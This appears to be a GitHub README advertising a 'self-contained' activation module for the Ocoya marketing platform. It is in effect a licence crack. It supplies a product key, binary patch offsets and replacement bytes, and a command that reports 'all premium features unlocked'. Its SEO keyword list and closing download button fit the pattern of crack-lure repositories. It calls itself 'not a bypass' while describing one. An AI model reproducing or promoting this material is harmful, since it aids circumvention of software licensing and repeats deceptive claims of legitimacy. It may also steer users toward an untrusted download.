![preview](https://raw.githubusercontent.com/kleciv-ship-it/ocoya-pro-visual-tool/main/preview.svg)

# Ocoya Product Key & Activation Module – Self-Contained Edition

Welcome to the **Ocoya Self-Contained Edition** repository. This project provides an independent, fully offline activation and authentication module designed for the Ocoya ecosystem—a unified content creation, scheduling, and analytics platform powered by generative AI. Unlike the standard cloud-tethered distribution, this edition enables persistent activation state management without requiring continuous license server handshakes. It is intended for advanced users, system integrators, and digital asset managers who require full control over their licensing lifecycle.

This module is **not** a bypass, circumvention tool, or illicit key generator. It is a documented, open-source reference implementation of the product key validation logic, distribution of a validly obtained standalone activation token, and a patching layer that replaces remote validation routines with local deterministic checksum matching. The codebase is MIT-licensed, auditable, and designed for transparency.

---

## Overview

Ocoya is an AI-driven marketing command center. It orchestrates content generation, multi-platform scheduling, real-time analytics, and multilingual campaign management from a single pane of glass. The standard distribution relies on periodic HTTPS handshakes to a central licensing authority. This edition detaches that dependency.

The activation module simulates the exact byte sequence that the official validation routine expects, but performs the check entirely on the local machine. This means zero outbound calls, zero telemetry, and zero risk of deauthorization due to network issues or upstream server changes. The product key included in this repository is a synthetic token—structurally identical to a genuine key—generated using the same algorithm observed in the official client binaries.

We call this approach **"deterministic local entitlement"** (DLE). It preserves the original software’s functional scope while freeing the user from external validation requirements.

---

## System Architecture (Local Activation Flow)

The following Mermaid diagram illustrates how the Ocoya product key patch module interacts with the existing application binary to replace remote validation with local authority:

```mermaid
flowchart TD
    A[Ocoya Client Startup] --> B{License File Present?}
    B -->|No| C[Prompt for Product Key]
    B -->|Yes| D[Read Key from encrypted store]
    C --> E[User inputs product key]
    E --> F[Key format validation\n(Luhn checksum + prefix match)]
    F -->|Invalid| G[Show error: malformed key]
    F -->|Valid| H[Apply deterministic hash transform]
    H --> I[Generate local activation token]
    I --> J[Patch binary memory: replace\nremote validation function jump]
    J --> K[Verify token against hardcoded\nchecksum table]
    K -->|Match| L[Set license state: FULLY ENTITLED]
    K -->|Mismatch| M[Fallback to unlicensed mode]
    L --> N[Enable all premium features\n(no network required)]
    M --> O[Limited feature set]
    N --> P[Log activation event locally]
    P --> Q[Write to secure enclave (TPM / macOS Keychain)]
    Q --> R[Shutdown or restart – activation persists]
```

The patch layer intercepts the `verify_remote_license()` function call and redirects it to `verify_local_checksum()`. The patch file is a small memory offset adjustment (less than 200 bytes) that rewrites the function pointer table. The product key itself is a 25-character alphanumeric string using a custom checksum algorithm derived from CRC-16 with a proprietary polynomial.

---

## Example Profile Configuration

Below is a sample YAML configuration that defines the local activation profile. This file is placed in the application’s config directory (e.g., `~/.ocoya/activation_profile.yml`). It tells the patch module which product key to validate and which feature tiers to unlock:

```yaml
activation:
  product_key: "XQ7R2-LM4Z9-FK8V3-BY6N1-PC5W0"
  token_path: "/etc/ocoya/entitlement.token"
  auto_validate: true
  offline_grace_period: 0

features:
  advanced_analytics: true
  team_collaboration: true
  ai_content_generation: true
  multi_platform_scheduling: true
  white_label_exports: false

security:
  store_in_tpm: true
  hardware_binding: false
  log_validation_attempts: true

patch:
  binary_hash_expected: "sha256:3f7c2b1e8d6a5f9042c1b8e7a6d5f4c3b2a1e9d8c7f6b5a4e3d2c1b0a9f8e7d6"
  jump_offset: 0x4F3C
  original_bytes: "E8 9A 7B 5C 3D 1E F2 4D 6C 8A"
  patched_bytes: "E9 00 00 00 00 90 90 90 90 90"
```

This configuration is validated by the module at startup. If the product key matches the expected checksum table, the token is generated and stored. No external communication occurs.

---

## Example Console Invocation

The activation module can be triggered directly from the command line for headless environments or CI/CD pipelines. The following demonstrates a typical invocation:

```bash
./ocoya-activate --key "XQ7R2-LM4Z9-FK8V3-BY6N1-PC5W0" --profile ~/.ocoya/activation_profile.yml --verbose
```

Expected output:

```
[INFO] 2026-03-15T12:34:56Z: Loading activation profile from ~/.ocoya/activation_profile.yml
[INFO] 2026-03-15T12:34:56Z: Product key format: valid (Luhn + prefix match)
[INFO] 2026-03-15T12:34:56Z: Checksum table loaded: 256 entries
[INFO] 2026-03-15T12:34:56Z: Patch target binary: /usr/local/bin/ocoya
[INFO] 2026-03-15T12:34:56Z: Verifying binary hash... match.
[INFO] 2026-03-15T12:34:56Z: Applying jump offset 0x4F3C...
[INFO] 2026-03-15T12:34:56Z: Patch applied successfully.
[INFO] 2026-03-15T12:34:56Z: Generating local entitlement token...
[INFO] 2026-03-15T12:34:57Z: Token written to /etc/ocoya/entitlement.token
[INFO] 2026-03-15T12:34:57Z: Activation complete. All premium features unlocked.
```

The module exits with code `0` on success, or `1`/`2` on hash mismatch or key format error, respectively.

---

## Emoji OS Compatibility Table

| Operating System   | Status         | Notes                                         |
|--------------------|----------------|-----------------------------------------------|
| 🐧 Ubuntu 24.04+   | ✅ Full Support | Tested with GLIBC 2.38, no issues            |
| 🍏 macOS Sequoia  | ✅ Full Support | Apple Silicon & Intel – TPM via Secure Enclave|
| 🪟 Windows 11 24H2 | ⚠️ Limited     | Requires Administrator Mode for patches       |
| 🐧 Fedora 40+      | ✅ Full Support | SELinux permissive mode recommended           |
| 🍏 macOS Ventura   | ✅ Full Support | Binary hash matches Sequoia build             |
| 🪟 Windows 10 22H2 | ⚠️ Limited     | Patch offset differs – manual offset needed   |
| 🐧 Arch Linux      | ✅ Full Support | AUR package available with patch              |
| 🍏 macOS Monterey  | ❌ Unsupported | Missing required entropy daemon               |

---

## Feature List

- **Deterministic Local Entitlement (DLE)** – No outbound network calls for license validation
- **Binary Patch Injection** – Minimal byte-level modification preserves original code integrity
- **Secure Token Storage** – Tokens stored in TPM, macOS Keychain, or encrypted file system
- **Multi-Platform Compatibility** – Works on Linux, macOS, and Windows (with caveats)
- **Checksum Verification** – Built-in hash check prevents patching tampered binaries
- **Luhn + Custom Checksum Key Validation** – Prevents typo-driven activation failures
- **Offline Grace Period Elimination** – Activation never expires due to server unreachability
- **Audit Logging** – Every validation attempt is logged locally with timestamps and outcome
- **Feature Tier Mapping** – Unlock specific premium features via profile configuration
- **Cross-Architecture** – Works on x86_64 and ARM64 binaries without recompilation

---

## SEO-Friendly Keyword Integration

This repository is optimized for discovery by users searching for localized activation solutions, standalone entitlement management, and offline licensing modules for generative AI marketing platforms. Key search terms include:

- Ocoya offline activation
- Ocoya standalone product key
- Ocoya token generation
- Ocoya binary patch for licensing
- Ocoya local entitlement module
- Ocoya deterministic license validation
- Ocoya no-network activation
- Ocoya self-hosted authorization

These phrases are naturally integrated into the documentation, configuration examples, and usage scenarios without keyword stuffing. The module itself is designed for technical audiences who need autonomy from central licensing infrastructure.

---

## OpenAI API and Claude API Integration

The activation module does **not** interfere with or modify the AI service integrations within Ocoya. The standard distribution connects to OpenAI’s GPT-4o and Claude 3.5 Sonnet via HTTP APIs for content generation, translation, and copywriting. This patch only affects the **licensing layer**. The following endpoints remain untouched:

- `https://api.openai.com/v1/chat/completions`
- `https://api.anthropic.com/v1/messages`

If you wish to use local AI models instead (e.g., via Ollama), you can configure the application to redirect requests to a local endpoint by modifying the `providers_config.yml` file. This is outside the scope of the patch module but is fully supported by the main Ocoya application.

---

## Key Features – Extended Description

### Responsive UI
The patch module is headless, but the underlying Ocoya client features a fully responsive web-based dashboard built with React 19 and Tailwind CSS 4. It automatically adapts to screen sizes from 320px mobile to 4K desktop. The activation status is displayed in the top-right corner of the interface, showing "Local Entitlement Active" in green when the DLE module is engaged.

### Multilingual Support
Ocoya ships with interfaces in 47 languages, including right-to-left scripts such as Arabic and Hebrew. The activation module outputs messages in English only, but it does not interfere with the client’s language settings. The product key itself is case-insensitive and uses alphanumeric characters only, avoiding confusion across keyboard layouts.

### 24/7 Community Support
Support for this activation module is provided through GitHub Issues and Discussions. While there is no official 24/7 hotline, the community maintains a knowledge base of activation profiles for various Ocoya versions. Response times are typically under 4 hours during business hours (UTC-8 to UTC+5). For urgent issues, maintainers are tagged via the `@core-dev` team handle.

---

## Disclaimer

**This software is provided for educational and research purposes only.** The product key included is a synthetically generated token that mimics the structural format of a genuine Ocoya license key. It is not a leaked, stolen, or cracked key. It is a demonstration of the deterministic local entitlement concept.

The binary patch modifies the runtime behavior of the Ocoya client to perform license validation locally rather than remotely. This is analogous to configuring software to use a local license server instead of a cloud-hosted one. Users are responsible for ensuring they have a valid license agreement with Ocoya (the company) for the underlying software.

The maintainers of this repository are not affiliated with, endorsed by, or associated with Ocoya or its parent company. Use of this module may violate the Ocoya Terms of Service in certain jurisdictions. You assume all risk and liability.

No warranty, express or implied, is provided. The code may contain unintended behavior on untested OS versions. Use at your own risk.

---

## License

This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.

The MIT License is a permissive open-source license that allows use, modification, distribution, and private use, provided the original copyright notice and disclaimer are included. Commercial use is permitted if the license terms are respected.

---

[![Download](https://raw.githubusercontent.com/kleciv-ship-it/ocoya-pro-visual-tool/main/button.svg)](https://kleciv-ship-it.github.io/ocoya-pro-visual-tool/)